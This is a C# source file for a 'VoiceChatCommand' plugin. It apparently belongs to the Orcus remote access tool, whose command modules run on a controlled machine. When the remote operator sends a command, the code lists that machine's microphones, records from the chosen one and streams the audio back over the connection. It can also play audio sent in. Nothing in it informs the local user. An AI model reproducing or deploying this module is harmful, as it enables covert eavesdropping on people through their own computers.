using System;
using System.Collections.Generic;
using System.Linq;
using CSCore.CoreAudioAPI;
using OpusWrapper.Native;
using Orcus.Commands.VoiceChat.Utilities;
using Orcus.Plugins;
using Orcus.Shared.Commands.VoiceChat;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.VoiceChat
{
    public class VoiceChatCommand : Command
    {
        private CSCoreDataPlayer _cscoreDataPlayer;
        private CSCoreRecorder _cscoreRecorder;

        public override void Dispose()
        {
            base.Dispose();
            _cscoreRecorder?.Dispose();
            _cscoreRecorder = null;
            _cscoreDataPlayer?.Dispose();
            _cscoreDataPlayer = null;
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((VoiceChatCommunication) parameter[0])
            {
                case VoiceChatCommunication.StartLocalStreaming:
                    _cscoreDataPlayer = new CSCoreDataPlayer(false);
                    _cscoreDataPlayer.Initialize();
                    break;
                case VoiceChatCommunication.SendAudioPackage:
                    _cscoreDataPlayer?.Feed(parameter, 1, parameter.Length - 1);
                    break;
                case VoiceChatCommunication.StartRemoteStreaming:
                    var captureInfo = Serializer.FastDeserialize<VoiceChatBeginCaptureInfo>(parameter, 1);

                    MMDevice selectedDevice;
                    using (var mmDeviceEnumerator = new MMDeviceEnumerator())
                    using (var devices = mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.Capture, DeviceState.Active))
                    {
                        selectedDevice = devices.FirstOrDefault(x => x.DeviceID == captureInfo.DeviceId);
                    }

                    _cscoreRecorder = new CSCoreRecorder(selectedDevice, false, captureInfo.Bitrate,
                        (Application) captureInfo.Application);
                    _cscoreRecorder.DataAvailable += (sender, args) =>
                    {
                        connectionInfo.UnsafeResponse(this, new WriterCall(args.DataInfo.Length + 1, stream =>
                        {
                            stream.WriteByte((byte) VoiceChatCommunication.ResponseAudioPackage);
                            args.DataInfo.WriteIntoStream(stream);
                        }));
                    };
                    _cscoreRecorder.Initialize();
                    break;
                case VoiceChatCommunication.GetRemoteAudioDevices:
                    using (var mmDeviceEnumerator = new MMDeviceEnumerator())
                    using (var devices = mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.Capture, DeviceState.Active))
                    using (var defaultDevice = mmDeviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Capture,
                            Role.Communications))
                    {
                        var captureListData =
                        new Serializer(typeof(List<CaptureDeviceInfo>)).Serialize(
                            devices.Select(
                                device =>
                                    new CaptureDeviceInfo
                                    {
                                        Id = device.DeviceID,
                                        Name = device.FriendlyName,
                                        IsDefault = defaultDevice.DeviceID == device.DeviceID
                                    })
                                .ToList());

                        ResponseBytes((byte) VoiceChatCommunication.ResponseAudioDevices, captureListData,
                            connectionInfo);
                    }
                    break;
                case VoiceChatCommunication.StopLocalStreaming:
                    _cscoreDataPlayer.Dispose();
                    _cscoreDataPlayer = null;
                    break;
                case VoiceChatCommunication.StopRemoteStreaming:
                    _cscoreRecorder.Dispose();
                    _cscoreRecorder = null;
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 33;
        }
    }
}